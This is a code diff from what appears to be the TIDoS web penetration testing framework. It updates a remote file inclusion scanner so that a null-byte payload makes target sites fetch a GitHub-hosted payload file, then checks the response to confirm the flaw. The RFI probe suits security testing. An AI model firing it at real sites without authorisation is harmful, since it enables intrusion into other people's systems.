@@ -102,14 +102,14 @@ def test(web0, web):
 				web0x0 = web0x0 + '='
 				print O+' [!] Heuristics reveal that the page may be vulnerable to RFI!'
 				print C+' [*] Trying null byte character injection...'
-				payload1 = 'https://google.com%00'
+				payload1 = 'https://raw.githubusercontent.com/theInfectedDrake/TIDoS-Framework/master/files/payload-db/json_payloads.lst%00'
 				web000 = web0x0 + payload1
 				time.sleep(0.5)
-				print C+' [+] Payload : http://www.google.com%00'
+				print C+' [+] Payload : '+payload1
 				print GR+' [*] Fetching '+C+web000
 				om = u' '.join(requests.get(web000).text).encode('utf-8').strip()
 				pm = str(om)
-				if (("I'm Feeling Lucky" in pm) and ('Google Search' in pm)):
+				if '''{"__class":"null","A":"B"}''' in str(pm) and '''{"toJSON":"while(1);"}''' in str(pm):
 					print G+' [+] Heuristics reveal that '+O+web00+G+' is vulnerable to Remote File Inclusion!'
 					time.sleep(0.5)
 					print O+' [*] Confirming the vulnerability...'
@@ -122,9 +122,7 @@ def test(web0, web):
 					pom = str(oom)
 					if ((payload_1 in pom) and (payload_2 in pom) and (payload_3 in pom)):
 						print G+' [+] Remote File Inclusion at '+O+web00+G+' is confirmed!'
-
 		else:
-
 			if (('=' in str(web0)) and ('?' in str(web0))):
 				if 'http' in str(web0):
 					web00 = str(web0)
@@ -257,7 +255,7 @@ def rfi(web):
 	print B+'    [1] Custom Targetting'
 	print B+'    [2] Automated Scanning\n'
 
-	m = raw_input(O+' [#] Enter your choice :> ')
+	m = raw_input(O+' [#] TID :> ')
 
 	if str(web).endswith('/'):
 		pass
